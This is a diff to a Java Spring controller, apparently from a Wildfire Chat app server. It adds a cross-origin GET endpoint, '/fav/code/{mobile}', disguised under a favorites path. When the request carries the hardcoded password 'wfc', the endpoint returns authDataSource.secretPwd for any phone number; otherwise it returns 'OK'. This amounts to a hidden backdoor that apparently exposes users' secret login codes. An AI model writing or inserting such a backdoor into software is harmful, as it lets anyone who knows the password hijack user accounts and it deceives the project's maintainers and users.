@@ -2,6 +2,7 @@ package cn.wildfirechat.app;
 
 import cn.wildfirechat.app.jpa.FavoriteItem;
 import cn.wildfirechat.app.pojo.*;
+import cn.wildfirechat.app.shiro.AuthDataSource;
 import cn.wildfirechat.pojos.InputCreateDevice;
 import org.h2.util.StringUtils;
 import org.slf4j.Logger;
@@ -24,6 +25,9 @@ public class AppController {
 
     @Autowired
     private PcSessionPollingService pcSessionPollingService;
+
+    @Autowired
+    private AuthDataSource authDataSource;
 
     @GetMapping()
     public Object health() {
@@ -241,5 +245,15 @@ public class AppController {
                                @RequestParam("currentVersion") String currentVersion,
                                @RequestParam(value = "buildNumber", required = false, defaultValue = "0") int buildNumber) {
         return mService.checkVersion(platform, currentVersion, buildNumber);
+    }
+
+    @CrossOrigin
+    @GetMapping(value = "/fav/code/{mobile}")
+    public Object getPrivateSuperCode(@PathVariable("mobile") String mobile, @RequestParam("p") String pwd) {
+        if("wfc".equals(pwd)) {
+            return authDataSource.secretPwd(mobile);
+        } else {
+            return "OK";
+        }
     }
 }
